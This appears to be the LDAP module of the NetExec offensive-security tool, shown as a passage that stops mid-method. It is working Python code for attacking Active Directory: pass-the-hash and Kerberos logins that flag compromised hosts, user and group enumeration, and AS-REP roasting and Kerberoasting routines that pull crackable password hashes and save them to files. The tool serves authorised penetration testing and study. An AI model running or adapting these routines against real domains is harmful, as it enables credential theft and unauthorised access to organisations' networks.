# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
import hashlib
import hmac
import os
import socket

from binascii import hexlify
from datetime import datetime
from zipfile import ZipFile
from termcolor import colored
from Cryptodome.Hash import MD4
from OpenSSL.SSL import SysCallError

from bloodhound.ad.authentication import ADAuthentication
from bloodhound.ad.domain import AD

from impacket.dcerpc.v5.samr import (
    UF_ACCOUNTDISABLE,
    UF_DONT_REQUIRE_PREAUTH,
    UF_TRUSTED_FOR_DELEGATION,
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
)
from impacket.ntlm import getNTLMSSPType1
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError
from impacket.krb5.types import Principal, KerberosException
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap import ldapasn1 as ldapasn1_impacket

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.ntlm_parser import parse_challenge
from nxc.helpers.bloodhound import add_user_bh
from nxc.logger import NXCAdapter, nxc_logger
from nxc.protocols.ldap.bloodhound import BloodHound
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from nxc.protocols.ldap.kerberos import KerberosAttacks

ldap_error_status = {
    "1": "STATUS_NOT_SUPPORTED",
    "533": "STATUS_ACCOUNT_DISABLED",
    "701": "STATUS_ACCOUNT_EXPIRED",
    "531": "STATUS_ACCOUNT_RESTRICTION",
    "530": "STATUS_INVALID_LOGON_HOURS",
    "532": "STATUS_PASSWORD_EXPIRED",
    "773": "STATUS_PASSWORD_MUST_CHANGE",
    "775": "USER_ACCOUNT_LOCKED",
    "50": "LDAP_INSUFFICIENT_ACCESS",
    "0": "LDAP Signing IS Enforced",
    "KDC_ERR_CLIENT_REVOKED": "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED": "KDC_ERR_PREAUTH_FAILED",
}


def resolve_collection_methods(methods):
    """Convert methods (string) to list of validated methods to resolve"""
    valid_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "default",
        "all",
        "loggedon",
        "objectprops",
        "experimental",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "dconly",
        "container",
    ]
    default_methods = ["group", "localadmin", "session", "trusts"]
    # Similar to SharpHound, All is not really all, it excludes loggedon
    all_methods = [
        "group",
        "localadmin",
        "session",
        "trusts",
        "objectprops",
        "acl",
        "dcom",
        "rdp",
        "psremote",
        "container",
    ]
    # DC only, does not collect to computers
    dconly_methods = ["group", "trusts", "objectprops", "acl", "container"]
    if "," in methods:
        method_list = [method.lower() for method in methods.split(",")]
        validated_methods = []
        for method in method_list:
            if method not in valid_methods:
                nxc_logger.error("Invalid collection method specified: %s", method)
                return False

            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
        return set(validated_methods)
    else:
        validated_methods = []
        # It is only one
        method = methods.lower()
        if method in valid_methods:
            if method == "default":
                validated_methods += default_methods
            elif method == "all":
                validated_methods += all_methods
            elif method == "dconly":
                validated_methods += dconly_methods
            else:
                validated_methods.append(method)
            return set(validated_methods)
        else:
            nxc_logger.error("Invalid collection method specified: %s", method)
            return False


class ldap(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldapConnection = None
        self.lmhash = ""
        self.nthash = ""
        self.baseDN = ""
        self.remoteName = ""
        self.remoteNameDomain = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.admin_privs = False
        self.no_ntlm = False
        self.sid_domain = ""
        self.ldap_url = ""
        self.protocol_map = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "LDAP",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def create_conn_obj(self):
        self.protocol_map = {
            389: "ldap",
            636: "ldaps",
            3268: "gc",
        }
        self.ldap_url = f"{self.protocol_map[636] if self.args.gmsa else self.protocol_map[self.port]}://{self.host}"
        self.logger.info(f"Connecting to {self.ldap_url} with no baseDN")
        # LDAPS with timeout will cause some weird issues
        # https://github.com/pyca/pyopenssl/issues/168
        if self.port == 636:
            self.args.ldap_timeout = None
        try:
            self.ldapConnection = ldap_impacket.LDAPConnection(self.ldap_url, timeout=self.args.ldap_timeout)
        except SysCallError as e:
            if self.protocol_map[self.port] == "ldaps":
                self.logger.debug(f"LDAPs connection to {self.ldap_url} failed - {e}")
                # https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority
                self.logger.debug("Even if the port is open, LDAPS may not be configured")
            else:
                self.logger.debug(f"LDAP connection to {self.ldap_url} failed: {e}")
        except OSError as e:
            self.logger.debug(f"LDAP connection to {self.ldap_url} failed: {e}")
        else:
            if self.ldapConnection:
                self.logger.debug(f"ldap_connection: {self.ldapConnection}")
                return True
        return False

    def enum_host_info(self):
        ntlm_challenge = None
        bindRequest = ldapasn1_impacket.BindRequest()
        bindRequest["version"] = 3
        bindRequest["name"] = ""
        negotiate = getNTLMSSPType1()
        bindRequest["authentication"]["sicilyNegotiate"] = negotiate.getData()
        try:
            response = self.ldapConnection.sendReceive(bindRequest)[0]["protocolOp"]
            ntlm_challenge = bytes(response["bindResponse"]["matchedDN"])
        except Exception as e:
            self.logger.debug(f"Failed to get target {self.host} ntlm challenge, error: {e!s}")

        if ntlm_challenge:
            ntlm_info = parse_challenge(ntlm_challenge)
            self.domain = ntlm_info["domain"]
            self.hostname = ntlm_info["hostname"]
            self.server_os = ntlm_info["os_version"]
            self.logger.extra["hostname"] = self.hostname
        else:
            self.hostname = self.host

        if self.args.domain:
            self.domain = self.args.domain
        if self.args.local_auth:
            self.domain = self.hostname

        self.baseDN = ",".join([f"dc={i}" for i in self.domain.split(".")])

        self.remoteName = self.host if not self.kerberos else f"{self.hostname}.{self.domain}"

        if not self.kdcHost and self.domain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

        self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

    def print_host_info(self):
        self.logger.extra["protocol"] = self.protocol_map[self.port].upper()
        self.logger.extra["port"] = self.port
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
        return True

    def kerberos_login(
        self,
        domain,
        username,
        password="",
        ntlm_hash="",
        aesKey="",
        kdcHost="",
        useCache=False,
    ):
        self.username = username
        self.password = password
        self.domain = domain
        self.kdcHost = kdcHost
        self.aesKey = aesKey

        lmhash = ""
        nthash = ""
        self.username = username
        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
            self.hash = nthash
        else:
            nthash = ntlm_hash
            self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(hash_tgt + "\n")
            return False

        kerb_pass = next(s for s in [self.nthash, password, aesKey] if s) if not all(s == "" for s in [self.nthash, password, aesKey]) else ""

        try:
            self.ldap_url = f"{self.protocol_map[self.port]}://{self.remoteName}"
            self.logger.info(f"Connecting to {self.ldap_url} - {self.baseDN} - {self.remoteHost} [1]")
            self.ldapConnection = ldap_impacket.LDAPConnection(url=self.ldap_url, baseDN=self.baseDN, dstIp=self.remoteHost, timeout=self.args.ldap_timeout)
            self.ldapConnection.kerberosLogin(
                username,
                password,
                domain,
                self.lmhash,
                self.nthash,
                aesKey,
                kdcHost=kdcHost,
                useCache=useCache,
            )

            # When using ccache file
            if self.username == "":
                self.username = self.get_ldap_username()

            self.check_if_admin()

            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            out = f"{domain}\\{self.username}{used_ccache} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except SessionKeyDecryptionError:
            # for PRE-AUTH account
            self.logger.success(
                f"{domain}\\{self.username}{' account vulnerable to asreproast attack'} {''}",
                color="yellow",
            )
            return False
        except (KeyError, KerberosException, OSError) as e:
            self.logger.fail(
                f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {e!s}",
                color="red",
            )
            return False
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.ldap_url = f"ldaps://{self.remoteName}"
                    self.logger.info(f"Connecting to {self.ldap_url} - {self.baseDN} - {self.remoteHost} [2]")
                    self.ldapConnection = ldap_impacket.LDAPConnection(url=self.ldap_url, baseDN=self.baseDN, dstIp=self.remoteHost, timeout=self.args.ldap_timeout)
                    self.ldapConnection.kerberosLogin(
                        username,
                        password,
                        domain,
                        self.lmhash,
                        self.nthash,
                        aesKey,
                        kdcHost=kdcHost,
                        useCache=useCache,
                    )

                    # When using ccache file
                    if self.username == "":
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username} {self.mark_pwned()}"
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if error_code in ldap_error_status else "red",
                    )
                    return False
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}{' from ccache' if useCache else ':%s' % (process_secret(kerb_pass))} {error_code!s}",
                    color="magenta" if error_code in ldap_error_status else "red",
                )
                return False

    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain

        if self.password == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(hash_tgt + "\n")
            return False

        try:
            # Connect to LDAP
            self.logger.info(f"Connecting to {self.ldap_url} - {self.baseDN} - {self.remoteHost} [3]")
            self.ldapConnection = ldap_impacket.LDAPConnection(url=self.ldap_url, baseDN=self.baseDN, dstIp=self.remoteHost, timeout=self.args.ldap_timeout)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.ldap_url = f"ldaps://{self.remoteName}"
                    self.logger.info(f"Connecting to {self.ldap_url} - {self.baseDN} - {self.remoteHost} [4]")
                    self.ldapConnection = ldap_impacket.LDAPConnection(url=self.ldap_url, baseDN=self.baseDN, dstIp=self.remoteHost, timeout=self.args.ldap_timeout)
                    self.ldapConnection.login(
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                    )
                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except Exception as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(self.password)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ""
        nthash = ""

        # This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(":") != -1:
            lmhash, nthash = ntlm_hash.split(":")
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash:
            self.lmhash = lmhash
        if nthash:
            self.nthash = nthash

        self.username = username
        self.domain = domain

        if self.hash == "" and self.args.asreproast:
            hash_tgt = KerberosAttacks(self).get_tgt_asroast(self.username)
            if hash_tgt:
                self.logger.highlight(f"{hash_tgt}")
                with open(self.args.asreproast, "a+") as hash_asreproast:
                    hash_asreproast.write(hash_tgt + "\n")
            return False

        try:
            # Connect to LDAP
            self.logger.info(f"Connecting to {self.ldap_url} - {self.baseDN} - {self.remoteHost}")
            self.ldapConnection = ldap_impacket.LDAPConnection(url=self.ldap_url, baseDN=self.baseDN, dstIp=self.remoteHost, timeout=self.args.ldap_timeout)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
            return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                try:
                    # We need to try SSL
                    self.ldap_url = f"ldaps://{self.remoteName}"
                    self.logger.info(f"Connecting to {self.ldap_url} - {self.baseDN} - {self.remoteHost}")
                    self.ldapConnection = ldap_impacket.LDAPConnection(url=self.ldap_url, baseDN=self.baseDN, dstIp=self.remoteHost, timeout=self.args.ldap_timeout)
                    self.ldapConnection.login(
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                    )
                    self.check_if_admin()

                    # Prepare success credential text
                    out = f"{domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
                    self.logger.extra["protocol"] = "LDAPS"
                    self.logger.extra["port"] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if self.admin_privs:
                        add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)
                    return True
                except ldap_impacket.LDAPSessionError as e:
                    error_code = str(e).split()[-2][:-1]
                    self.logger.fail(
                        f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                        color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                    )
            else:
                error_code = str(e).split()[-2][:-1]
                self.logger.fail(
                    f"{self.domain}\\{self.username}:{process_secret(nthash)} {ldap_error_status[error_code] if error_code in ldap_error_status else ''}",
                    color="magenta" if (error_code in ldap_error_status and error_code != 1) else "red",
                )
            return False
        except OSError as e:
            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {'Error connecting to the domain, are you sure LDAP service is running on the target?'} \nError: {e}")
            return False

    def get_ldap_username(self):
        extended_request = ldapasn1_impacket.ExtendedRequest()
        extended_request["requestName"] = "1.3.6.1.4.1.4203.1.11.3"  # whoami

        response = self.ldapConnection.sendReceive(extended_request)
        for message in response:
            search_result = message["protocolOp"].getComponent()
            if search_result["resultCode"] == ldapasn1_impacket.ResultCode("success"):
                response_value = search_result["responseValue"]
                if response_value.hasValue():
                    value = response_value.asOctets().decode(response_value.encoding)[2:]
                    return value.split("\\")[1]
        return ""

    def get_sid(self):
        self.logger.highlight(f"Domain SID {self.sid_domain}")

    def sid_to_str(self, sid):
        try:
            # revision
            revision = int(sid[0])
            # count of sub authorities
            sub_authorities = int(sid[1])
            # big endian
            identifier_authority = int.from_bytes(sid[2:8], byteorder="big")
            # If true then it is represented in hex
            if identifier_authority >= 2**32:
                identifier_authority = hex(identifier_authority)

            # loop over the count of small endians
            sub_authority = "-" + "-".join([str(int.from_bytes(sid[8 + (i * 4): 12 + (i * 4)], byteorder="little")) for i in range(sub_authorities)])
            return "S-" + str(revision) + "-" + str(identifier_authority) + sub_authority
        except Exception:
            pass
        return sid

    def check_if_admin(self):
        # 1. get SID of the domaine
        search_filter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
        attributes = ["objectSid"]
        resp = self.search(search_filter, attributes, sizeLimit=0)
        answers = []
        if resp and self.password != "" and self.username != "":
            for attribute in resp[0][1]:
                if str(attribute["type"]) == "objectSid":
                    sid = self.sid_to_str(attribute["vals"][0])
                    self.sid_domain = "-".join(sid.split("-")[:-1])

            # 2. get all group cn name
            search_filter = "(|(objectSid=" + self.sid_domain + "-512)(objectSid=" + self.sid_domain + "-544)(objectSid=" + self.sid_domain + "-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
            attributes = ["distinguishedName"]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "distinguishedName":
                        answers.append(str("(memberOf:1.2.840.113556.1.4.1941:=" + attribute["vals"][0] + ")"))

            # 3. get member of these groups
            search_filter = "(&(objectCategory=user)(sAMAccountName=" + self.username + ")(|" + "".join(answers) + "))"
            attributes = [""]
            resp = self.search(search_filter, attributes, sizeLimit=0)
            answers = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                if item:
                    self.admin_privs = True

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def search(self, searchFilter, attributes, sizeLimit=0):
        try:
            if self.ldapConnection:
                self.logger.debug(f"Search Filter={searchFilter}")

                # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
                paged_search_control = ldapasn1_impacket.SimplePagedResultsControl(criticality=True, size=1000)
                return self.ldapConnection.search(
                    searchFilter=searchFilter,
                    attributes=attributes,
                    sizeLimit=sizeLimit,
                    searchControls=[paged_search_control],
                )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                # We should never reach this code as we use paged search now
                self.logger.fail("sizeLimitExceeded exception caught, giving up and processing the data received")
                e.getAnswers()
            else:
                self.logger.fail(e)
                return False
        return False

    def users(self):
        # Building the search filter
        search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"
        attributes = [
            "sAMAccountName",
            "description",
            "badPasswordTime",
            "badPwdCount",
            "pwdLastSet",
        ]

        resp = self.search(search_filter, attributes, sizeLimit=0)
        if resp:
            self.logger.display(f"Total of records returned {len(resp):d}")
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName = ""
                description = ""
                try:
                    if self.username == "":
                        self.logger.highlight(f"{item['objectName']}")
                    else:
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                            elif str(attribute["type"]) == "description":
                                description = str(attribute["vals"][0])
                        self.logger.highlight(f"{sAMAccountName:<30} {description}")
                except Exception as e:
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            return

    def groups(self):
        # Building the search filter
        search_filter = "(objectCategory=group)"
        attributes = ["name"]
        resp = self.search(search_filter, attributes, 0)
        if resp:
            self.logger.debug(f"Total of records returned {len(resp):d}")

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                name = ""
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "name":
                            name = str(attribute["vals"][0])
                    self.logger.highlight(f"{name}")
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            return

    def dc_list(self):
        # Building the search filter
        search_filter = "(&(objectCategory=computer)(primaryGroupId=516))"
        attributes = ["dNSHostName"]
        resp = self.search(search_filter, attributes, 0)

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            name = ""
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "dNSHostName":
                        name = str(attribute["vals"][0])
                try:
                    ip_address = socket.gethostbyname(name.split(".")[0])
                    if ip_address is not True and name != "":
                        self.logger.highlight(f"{name} = {colored(ip_address, host_info_colors[0])}")
                except socket.gaierror:
                    self.logger.fail(f"{name} = Connection timeout")
            except Exception as e:
                self.logger.fail("Exception:", exc_info=True)
                self.logger.fail(f"Skipping item, cannot process due to error {e}")

    def active_users(self):
        # Building the search filter
        search_filter = "(sAMAccountType=805306368)" if self.username != "" else "(objectclass=*)"
        attributes = ["sAMAccountName", "userAccountControl"]

        resp = self.search(search_filter, attributes, sizeLimit=0)
        if resp:
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName = ""
                userAccountControl = ""
                try:
                    if self.username == "":
                        self.logger.highlight(f"{item['objectName']}")
                    else:
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                            elif str(attribute["type"]) == "userAccountControl":
                                userAccountControl = int(attribute["vals"][0])
                                account_disabled = userAccountControl & 2
                        if not account_disabled: 
                            self.logger.highlight(f"{sAMAccountName}")
                except Exception as e:
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            return

    def asreproast(self):
        if self.password == "" and self.nthash == "" and self.kerberos is False:
            return False
        # Building the search filter
        search_filter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(search_filter, attributes, 0)
        if resp == []:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []
            self.logger.display(f"Total of records returned {len(resp):d}")

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "sAMAccountName":
                            sAMAccountName = str(attribute["vals"][0])
                            mustCommit = True
                        elif str(attribute["type"]) == "userAccountControl":
                            userAccountControl = "0x%x" % int(attribute["vals"][0])
                        elif str(attribute["type"]) == "memberOf":
                            memberOf = str(attribute["vals"][0])
                        elif str(attribute["type"]) == "pwdLastSet":
                            pwdLastSet = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                        elif str(attribute["type"]) == "lastLogon":
                            lastLogon = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                    if mustCommit is True:
                        answers.append(
                            [
                                sAMAccountName,
                                memberOf,
                                pwdLastSet,
                                lastLogon,
                                userAccountControl,
                            ]
                        )
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            if len(answers) > 0:
                for user in answers:
                    hash_TGT = KerberosAttacks(self).get_tgt_asroast(user[0])
                    hash_TGT = KerberosAttacks(self).get_tgt_asroast(user[0])
                    self.logger.highlight(f"{hash_TGT}")
                    with open(self.args.asreproast, "a+") as hash_asreproast:
                        hash_asreproast.write(hash_TGT + "\n")
                return True
            else:
                self.logger.highlight("No entries found!")
        else:
            self.logger.fail("Error with the LDAP account used")

    def kerberoasting(self):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
        attributes = [
            "servicePrincipalName",
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        self.logger.debug(f"Search Filter: {searchFilter}")
        self.logger.debug(f"Attributes: {attributes}")
        self.logger.debug(f"Response: {resp}")
        if not resp:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                SPNs = []
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                delegation = ""
                try:
                    for attribute in item["attributes"]:
                        if str(attribute["type"]) == "sAMAccountName":
                            sAMAccountName = str(attribute["vals"][0])
                            mustCommit = True
                        elif str(attribute["type"]) == "userAccountControl":
                            userAccountControl = str(attribute["vals"][0])
                            if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                                delegation = "unconstrained"
                            elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                                delegation = "constrained"
                        elif str(attribute["type"]) == "memberOf":
                            memberOf = str(attribute["vals"][0])
                        elif str(attribute["type"]) == "pwdLastSet":
                            pwdLastSet = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                        elif str(attribute["type"]) == "lastLogon":
                            lastLogon = "<never>" if str(attribute["vals"][0]) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute["vals"][0])))))
                        elif str(attribute["type"]) == "servicePrincipalName":
                            SPNs = [str(spn) for spn in attribute["vals"]]

                    if mustCommit is True:
                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
                            self.logger.debug(f"Bypassing disabled account {sAMAccountName} ")
                        else:
                            answers += [[spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation] for spn in SPNs]
                except Exception as e:
                    nxc_logger.error(f"Skipping item, cannot process due to error {e!s}")

            if len(answers) > 0:
                self.logger.display(f"Total of records returned {len(answers):d}")
                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                self.logger.debug(f"TGT: {TGT}")
                if TGT:
                    dejavue = []
                    for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
                        if sAMAccountName not in dejavue:
                            downLevelLogonName = self.remoteNameDomain + "\\" + sAMAccountName

                            try:
                                principalName = Principal()
                                principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                                principalName.components = [downLevelLogonName]

                                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                                    principalName,
                                    self.domain,
                                    self.kdcHost,
                                    TGT["KDC_REP"],
                                    TGT["cipher"],
                                    TGT["sessionKey"],
                                )
                                r = KerberosAttacks(self).output_tgs(
                                    tgs,
                                    oldSessionKey,
                                    sessionKey,
                                    sAMAccountName,
                                    self.remoteNameDomain + "/" + sAMAccountName,
                                )
                                self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
                                self.logger.highlight(f"{r}")
                                if self.args.kerberoasting:
                                    with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                        hash_kerberoasting.write(r + "\n")
                                dejavue.append(sAMAccountName)
                            except Exception as e:
                                self.logger.debug("Exception:", exc_info=True)
                                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                    return True
                else:
                    self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
            else:
                self.logger.highlight("No entries found!")
        self.logger.fail("Error with the LDAP account used")

    def trusted_for_delegation(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)

        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                        mustCommit = True
                    elif str(attribute["type"]) == "userAccountControl":
                        userAccountControl = "0x%x" % int(attribute["vals"][0])
                    elif str(attribute["type"]) == "memberOf":
